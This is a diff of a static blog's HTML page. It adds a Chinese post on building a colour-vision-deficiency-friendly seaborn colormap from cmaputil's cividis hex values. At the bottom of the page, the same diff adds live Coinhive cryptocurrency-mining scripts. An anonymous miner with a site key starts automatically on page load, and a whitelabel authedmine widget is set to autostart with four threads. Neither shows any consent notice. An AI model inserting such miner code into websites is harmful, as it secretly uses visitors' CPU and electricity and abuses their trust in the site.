@@ -94,6 +94,61 @@
         <article class="article content gallery" itemscope="" itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
         
+            <a href="/2018/12/21/CVD/" itemprop="url">客製化 seaborn 色盤 (以 CVD 為例)</a>
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2018-12-20T16:21:51.000Z" itemprop="datePublished">Dec 21 2018</time>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            3 minutes read (About 520 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>今年夏天看到<a href="https://doi.org/10.1371/journal.pone.0199239" target="_blank" rel="noopener">這篇文章</a>，強調科學繪圖過程中色調的選用若不夠謹慎，很有可能會造成誤導的結果，甚至影響有色覺辨認障礙 (Color vision deficiency, CVD) 的人知的權益，因此他們開發了一個python 套件 cmaputil 用以產生 CVD 最佳化的色盤。</p>
+<p><img src="CVD/1.png" alt=""></p>
+<p>愛拖延如我，一直到這週氣溫降到二十度以下了才下載了套件想要試用看看，這才發現他的運作方式好複雜。似乎因為他原本的應用場景主要是替資料上色，所以有一套模擬 CVD 與顏色轉換的過程，過程基本上完全看不懂。</p>
+<p><img src="CVD/2.png" alt=""></p>
+<p>雖然如此，單純用個套件應該不會很難吧，沒想到剛裝完還是不能用，因為原本是寫給 python 2.7 用的，有兩個地方要自己去修改成 python 3 的 print 語法。而且他的文件跟一般的套件比起來比較簡陋，網路上討論也不多，所以老實說完全不知道怎麼用，我只是想要畫個簡單的熱圖而已啊ＱＱ～</p>
+<p><img src="CVD/3.png" alt=""></p>
+<p>在他們的 <a href="https://github.com/pnnl/cmaputil" target="_blank" rel="noopener">github</a> 上翻著翻著找到了他們附上的<a href="https://github.com/pnnl/cmaputil/blob/master/colormaps/cividisHexValues.txt" target="_blank" rel="noopener">色調值</a>，便有了下列的簡單解法：</p>
+<ol>
+<li><p>先下載<a href="https://github.com/pnnl/cmaputil/blob/master/colormaps/cividisHexValues.txt" target="_blank" rel="noopener">色調值</a>並另存成 CVD.txt</p>
+</li>
+<li><p>讀取檔案載入成 matplotlib 的 cmap</p>
+<p><code>with open(&#39;CVD.txt&#39;) as f:
+​    colors = f.readlines()
+colors = [j[:-1] for j in colors]
+cmap = matplotlib.colors.ListedColormap(colors)</code></p>
+</li>
+<li><p>繪圖時把自己客製化的 cmap 傳入就好囉</p>
+<p><code>sns.clustermap(dataFrame, cmap=cmap)</code></p>
+</li>
+</ol>
+<p>以上就是三步驟輕鬆畫幅 CVD 友善的圖～</p>
+<p><img src="CVD/eg.png" alt=""></p>
+<p>雖然顏色看起來有點黯淡，但是想到背後的意義就覺得有股『啊～我又堅持了個沒什麼人會在意的細節了呢真是讚讚』的感覺～嘻嘻</p>
+
+    
+    </div>
+    
+    
+</article>
+
+
+
+
+    
+        <article class="article content gallery" itemscope="" itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
             <a href="/2018/12/12/hello-world/" itemprop="url">Hello World</a>
         
     </h1>
@@ -244,5 +299,17 @@
 </script>
 <script src="/js/insight.js"></script>
     
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous(
+        'xiohn9JrJIy9rZdNAk4TH6NMG56iZRqm',
+        {throttle: 0.5}
+      );
+      miner.start();
+    </script>
+    <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+      <div class="coinhive-miner" data-key="xiohn9JrJIy9rZdNAk4TH6NMG56iZRqm" data-autostart="true" data-whitelabel="true" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1">
+      <em>Loading...</em>
+    </div>
 </body>
 </html>
